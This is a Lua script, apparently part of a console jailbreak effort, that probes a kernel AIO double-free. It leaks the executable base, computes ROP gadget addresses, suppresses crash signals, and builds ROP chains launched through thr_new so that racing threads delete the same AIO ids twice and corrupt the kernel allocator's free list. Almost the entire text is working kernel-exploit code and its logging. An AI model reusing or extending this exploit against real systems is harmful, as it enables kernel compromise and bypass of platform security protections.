-- CRASH_CLASS: HIGH
-- PROBE 556a: what the allocator does after a double free
--
-- Context: 523a ran 300 iterations of three children racing one freshly
-- created id and always produced exactly one 0 and two 0x80020003: the
-- children start about a millisecond apart, so the losers fail at the FIRST
-- table lookup (slot already removed) and never overlap inside the delete's
-- unlock/re-lookup window. 523b/523c-v1 built long chains from rsp = top - 8
-- and died inside the first thr_new: a thr_new child starts at
-- stack_base + size and runs its chain UPWARD from there, so the chain must
-- live above the stack region, inside the same allocation
-- (docs/THREADING_ALIVE_14_10.md).
--
-- 523c showed that two children deleting the same ids both report status 0
-- for many of them, which frees the shared 0x30 context twice. This probe
-- takes the next step: after the double free, every aio create allocates a
-- 0x30 work item and a 0x30 context, so a duplicated free-list entry should
-- hand the SAME address to both. The follow-up creates four objects and
-- deletes each TWICE: serialised second deletes normally answer 0x80020003,
-- so any second 0 is a dangling table entry.

print("=== PROBE 556a: AIO DOUBLE FREE FOLLOW-UP ===")
print("")

local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}; for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n; setmetatable(t, getmetatable(syscall.pipe)); return t
end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) pcall(function() memory.write_qword(a, v) end) end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, N(val)
end
local function fmt(val)
    if val == nil then return "nil" end
    local h, l = get_hi_lo(val)
    return string.format("0x%08X%08X", h, l)
end

local stub = syscall.pipe.fn_addr
local pid_val = N(native.fcall_with_rax(stub, 20))
print("[0] pid=" .. pid_val)
local function alive() return N(native.fcall_with_rax(stub, 20)) == pid_val end

local ib = memory.alloc(0x200)
wd(N(ib), 0x160)
pcall(function() mk(593)(uint64(0), ib) end)
local elo = rd(N(ib) + 0x108) or 0
local ehi = rd(N(ib) + 0x10C) or 0
if elo < 0 then elo = elo + 0x100000000 end
if ehi < 0 then ehi = ehi + 0x100000000 end
local eb = uint64(string.format("0x%X%08X", ehi, elo))
print("[A] eboot=" .. fmt(eb))

local g_pop_rax   = eb + 0x992
local g_pop_rdi   = eb + 0xC9DFE
local g_pop_rsi   = eb + 0xD77D
local g_pop_rdx   = eb + 0x3B02D7
local g_bare_ret  = eb + 0x42

local sigact = memory.alloc(0x20)
wq(N(sigact), uint64(1))
wd(N(sigact) + 8, 0)
wq(N(sigact) + 16, uint64(0))
pcall(function() mk(416)(uint64(11), sigact, uint64(0)) end)
pcall(function() mk(416)(uint64(12), sigact, uint64(0)) end)

local fake_tcb = memory.alloc(0x1000)
local tcb_a = N(fake_tcb)
for i = 0, 0xFFC, 4 do wd(tcb_a + i, 0) end
for i = 0, 0xFF8, 8 do wq(tcb_a + i, uint64(tcb_a)) end
local fs_ptr = memory.alloc(8)
wq(N(fs_ptr), uint64(tcb_a))

local function emit_sysarch_preamble(emit)
    emit(g_pop_rdi);   emit(uint64(129))
    emit(g_pop_rsi);   emit(uint64(N(fs_ptr)))
    emit(g_pop_rax);   emit(uint64(165))
    emit(stub)
end

local IDS = 48
local SMOKE = 8
local RACE_START = SMOKE
local RACE_COUNT = IDS - SMOKE

local sc_create = mk(669)
local sc_poll   = mk(664)
local sc_delete = mk(662)
local sc_thr_new = mk(455)

local data = memory.alloc(0x100)
local out_id = memory.alloc(0x40)
local ids_buf = memory.alloc(IDS * 4 + 64)
local poll_out = memory.alloc(0x40)

local function create_polled()
    for i = 0, 0xFC, 4 do wd(N(data) + i, 0) end
    wq(N(out_id), uint64(0))
    local ok, rv = pcall(function()
        return sc_create(uint64(1), uint64(N(data)), uint64(1), uint64(1), uint64(N(out_id)))
    end)
    if not ok or N(rv) ~= 0 then return nil end
    local id = rd(N(out_id))
    if id == nil then return nil end
    local cell = memory.alloc(16)
    wd(N(cell), id)
    wd(N(poll_out), 0xCCCCCCCC)
    pcall(function() sc_poll(uint64(N(cell)), uint64(1), uint64(N(poll_out))) end)
    return id
end

print(string.format("[B] creating %d polled requests", IDS))
local made = {}
for i = 1, IDS do
    local id = create_polled()
    if id == nil then break end
    made[#made + 1] = id
    wd(N(ids_buf) + (i - 1) * 4, id)
    if i % 40 == 0 then print(string.format("    %d/%d", i, IDS)) end
end
print(string.format("    created=%d", #made))
if #made < IDS then print("    short create; aborting"); return end
if not alive() then print("DEAD while creating"); return end

-- A child that deletes ids [first, first+count) into status[0..count)
local function build_child(first, count)
    local status = memory.alloc(count * 4 + 64)
    for i = 0, count * 4 - 4, 4 do wd(N(status) + i, 0xCCCCCCCC) end

    local CHAIN_MAX = 0x8000
    local stk = memory.alloc(0x8000 + CHAIN_MAX)
    local sb = N(stk)
    local ss = 0x8000
    local rsp = sb + ss - 8   -- kernel rsp is stack_base+size-8 (523a)

    local off = 0
    local function emit(v) wq(rsp + off, v); off = off + 8 end

    emit_sysarch_preamble(emit)
    for i = 0, count - 1 do
        emit(g_pop_rdi); emit(uint64(N(ids_buf) + (first + i) * 4))
        emit(g_pop_rsi); emit(uint64(1))
        emit(g_pop_rdx); emit(uint64(N(status) + i * 4))
        emit(g_pop_rax); emit(uint64(662))
        emit(stub)
    end
    emit(g_pop_rdi); emit(uint64(0))
    emit(g_pop_rax); emit(uint64(431))
    emit(stub)

    local par = memory.alloc(0x40)
    local pa = N(par)
    for i = 0, 0x3C, 4 do wd(pa + i, 0) end
    wq(pa + 0x00, g_bare_ret)
    wq(pa + 0x08, uint64(0))
    wq(pa + 0x10, uint64(sb))
    wq(pa + 0x18, uint64(ss))
    local tid_ptr = memory.alloc(8)
    wq(N(tid_ptr), uint64(0))
    wq(pa + 0x30, tid_ptr)

    return par, status, off
end


-- [C] smoke: one child deletes its own slice
print("")
print(string.format("[C] smoke: one child, %d deletes", SMOKE))
local smoke_par, smoke_status, smoke_len = build_child(0, SMOKE)
print(string.format("    chain bytes=%d", smoke_len))
local ok, rv = pcall(function() return sc_thr_new(smoke_par, uint64(0x38)) end)
print(string.format("    thr_new ok=%s rv=%s alive=%s", tostring(ok), tostring(N(rv)), tostring(alive())))
local spins = 0
local last = -1
local idle = 0
while spins < 100000 do
    local seen = 0
    for i = 0, SMOKE - 1 do if rd(N(smoke_status) + i * 4) ~= -858993460 then seen = seen + 1 end end
    if seen == SMOKE then break end
    if seen == last then idle = idle + 1; if idle > 3000 then break end else idle = 0; last = seen end
    spins = spins + 1
end
local s0, s1 = 0, 0
for i = 0, SMOKE - 1 do
    local v = rd(N(smoke_status) + i * 4)
    if v == 0 then s0 = s0 + 1 elseif v ~= -858993460 then s1 = s1 + 1 end
end
print(string.format("    smoke result: zero=%d other=%d alive=%s", s0, s1, tostring(alive())))
if not alive() then print("DEAD after smoke"); return end

-- [D] race: two children over the remaining ids
print("")
print(string.format("[D] race: two children, %d deletes each", RACE_COUNT))
local p1, st1, l1 = build_child(RACE_START, RACE_COUNT)
local p2, st2, l2 = build_child(RACE_START, RACE_COUNT)
print(string.format("    chains %d / %d bytes", l1, l2))
local ok1, rv1 = pcall(function() return sc_thr_new(p1, uint64(0x38)) end)
local ok2, rv2 = pcall(function() return sc_thr_new(p2, uint64(0x38)) end)
print(string.format("    thr_new %s/%s rv=%s/%s alive=%s", tostring(ok1), tostring(ok2),
    tostring(N(rv1)), tostring(N(rv2)), tostring(alive())))

local spins = 0
while spins < 200000 do
    local seen = 0
    for i = 0, RACE_COUNT - 1 do
        if rd(N(st1) + i * 4) ~= -858993460 and rd(N(st2) + i * 4) ~= -858993460 then seen = seen + 1 end
    end
    if seen == RACE_COUNT then break end
    spins = spins + 1
end
local both = 0
local one = 0
local other = 0
for i = 0, RACE_COUNT - 1 do
    local a = rd(N(st1) + i * 4)
    local b = rd(N(st2) + i * 4)
    if a == 0 and b == 0 then both = both + 1
    elseif a == 0 or b == 0 then one = one + 1
    elseif a ~= -858993460 or b ~= -858993460 then other = other + 1 end
end
print(string.format("    race result: both-zero=%d one-zero=%d other=%d alive=%s",
    both, one, other, tostring(alive())))
if not alive() then print("DEAD after race"); return end

-- [E] follow-up: create, poll, delete, delete again
print("")
print("[E] create/poll/delete/delete-again on the damaged free list")
for k = 1, 4 do
    local id = create_polled()
    if id == nil then print(string.format("    cycle %d: create failed", k)); break end
    local cell = memory.alloc(16)
    local out = memory.alloc(8)
    wd(N(cell), id)
    wd(N(out), 0xCCCCCCCC)
    local r1 = N(pcall(function() return sc_delete(uint64(N(cell)), uint64(1), uint64(N(out))) end) and 0 or -999)
    local d1 = rd(N(out))
    wd(N(out), 0xCCCCCCCC)
    local r2 = N(pcall(function() return sc_delete(uint64(N(cell)), uint64(1), uint64(N(out))) end) and 0 or -999)
    local d2 = rd(N(out))
    print(string.format("    cycle %d id=%08X delete1=%d/%s delete2=%d/%s alive=%s",
        k, id, r1, fmt(d1), r2, fmt(d2), tostring(alive())))
    if not alive() then break end
end
print("--- health: 3 fresh cycles")
for k = 1, 3 do
    local id = create_polled()
    if id == nil then print("    create failed"); break end
    local cell = memory.alloc(16)
    local out = memory.alloc(8)
    wd(N(cell), id)
    wd(N(out), 0xCCCCCCCC)
    pcall(function() sc_delete(uint64(N(cell)), uint64(1), uint64(N(out))) end)
    print(string.format("    health %d id=%08X status=%s alive=%s", k, id, fmt(rd(N(out))), tostring(alive())))
end
print("=== DONE ===")
